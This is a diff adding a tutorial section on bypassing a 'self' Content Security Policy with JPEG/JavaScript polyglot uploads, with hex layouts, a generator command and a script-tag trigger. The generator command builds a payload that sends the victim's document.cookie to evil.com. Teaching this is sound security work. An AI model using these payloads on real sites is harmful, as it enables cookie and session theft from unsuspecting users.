@@ -343,6 +343,56 @@ However, an attacker can bypass the above CSP since it does not specify exact Ja
 
 ### 6.2.4 Bypassing `self` Content Security Policy Using Polyglots
 
-**TODO**
+XSS vulnerabilities can still be exploited if script sources are set to `self` in the CSP if users can upload files to the server. The simplest method to bypass the self CSP is to check if uploading a JavaScript file works and then using that as the script source. However, most modern web applications would validate the filetype of an uploaded file before accepting it.
 
-*Might exclude since it is tough*
+This is where Polyglot payloads become important for bypassing file upload restrictions. A polyglot file is a valid form of multiple different file types. 
+If you are allowed to upload JPEG images to a website and the `X-Content-Type-Options: nosniff` response header then you can exploit a XSS vulnerability and bypass the CSP by using a JPEG/JavaScript polyglot file.
+
+The idea of a polyglot JPEG/JavaScript was first introduced in [this PortSwigger article back in 2016](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs). The trick is to modify a bytes of the JPEG image so it will start with something like the following hex values
+
+```
+FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 48 00 00 00 00 00 00 00 00 00 00
+....
+```
+
+Specifying that the JavaScript file is using the ISO-8859-1 charset, the first four bytes `FF D8 FF E0` will get interpreted as a JavaScript variable name and `2F 2A` is `/*` a multline comment in JavaScript. The `2F 2A` is also the length of the JPEG header (following the JPEG file structure), so you would need to pad null bytes (`00`) in the header to match the length. Then in the comment section of the JPEG header you would have something like below.
+
+```
+FF FE 00 1C 2A 2F 3D 61 6C 65 72 74 28 22 42 75 72 70 20 72 6F 63 6B 73 2E 22 29 3B 2F 2A
+```
+
+The `FF FE` indicates that this is the start of the comment, the `00 1C` specifies the length of the comment and `2A 2F 3D` is `*/=`. After this we insert our XSS payload (which is just `alert("Burp rocks."))` in the above example) and start another comment.
+
+Finally we need to close the JavaScript comment by modifying the last 4 bytes of the image. `FF D9` are the end of image marker for JPEG images.
+
+```
+2A 2F 2F 2F FF D9
+```
+
+*Pretty confusing and complicated?*
+
+That's alright if you are confused, we are going to cheat a little and use an existing tool to generate the JPEG/JavaScript polyglot (although if you are interested try making your own).
+
+I have developed a ~~buggy~~ polyglot JPEG/JavaScript generator that you can [download from here called `xjt`](https://github.com/Ccamm/Polyglot-JPEG-XSS). Otherwise [js-on created another JPEG/JavaScript generator that you can download from here](https://github.com/js-on/jpeg_polyglot_xss).
+
+Assuming that you are using `xjt`, you can generate your polyglot payload using a similar command to the one below.
+
+```bash
+$ xjt -p 'document.location="https://evil.com?nomnom="+btoa(document.cookie);' -o payload.jpg
+```
+
+Then to trigger the XSS vulnerability:
+
+1. Upload the payload.jpg to the server and note the URL path to the image.
+2. To trigger the XSS payload, inject a `script` tag and set the source to the URL of the image and the charset to `ISO-8859-1` as shown below.
+3. *Profit*
+
+```html
+<script charset="ISO-8859-1" src="/images/uploads/83ab453ee072b1ad"></script>
+```
+
+---
+
+### Bypassing `self` CSP Exercise
+
+**To do**
